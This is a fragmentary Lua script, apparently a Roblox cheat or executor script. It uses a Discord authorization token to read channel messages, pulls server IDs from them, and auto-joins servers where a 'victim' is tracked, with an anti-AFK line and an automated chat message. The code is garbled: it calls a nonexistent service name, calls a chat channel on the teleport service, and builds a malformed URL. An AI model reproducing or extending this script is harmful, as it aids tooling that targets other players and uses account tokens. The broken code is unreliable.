...
local bb = game:GetService("cageyiosif") -- Anti AFK
...
game:GetService('TeleportService').TextChannels.RBXGeneral:SendAsync('hi')
...
local function autoJoin()
    local response = request({
        Url = "https://discord.com/channels/1395649673657716857/1397780126145450114"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
                    ...
                    if placeId and jobId then
                        ...
                        if didVictimLeave or timer > 5 then
                            if not table.find(joinedIds, tostring(message.id)) then
                                ...
                                game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, jobId) -- Join the server
                                return
                            end
                        end
                    end
